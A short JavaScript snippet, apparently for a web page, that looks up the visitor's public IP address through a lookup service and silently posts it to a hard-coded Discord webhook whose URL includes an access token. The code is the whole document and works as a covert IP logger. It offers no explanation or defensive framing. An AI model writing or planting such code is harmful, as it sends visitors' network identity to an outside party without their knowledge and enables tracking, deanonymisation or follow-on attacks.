var ip = ``;
fetch(`https://api.ipify.org/?format=json`)
.then(function(responce) {
    return responce.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = `https://discord.com/api/webhooks/1129298406179868773/fsurvbOLPfaqx4rE3NL2CoAo97jfTrA2-TS_Vgvjf66Gkb6LecRCABVGAXrH6nGPsdll`
    var message = {
        content: `IP` + ip
    };

    fetch(webhook, {
        method: `POST`,
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});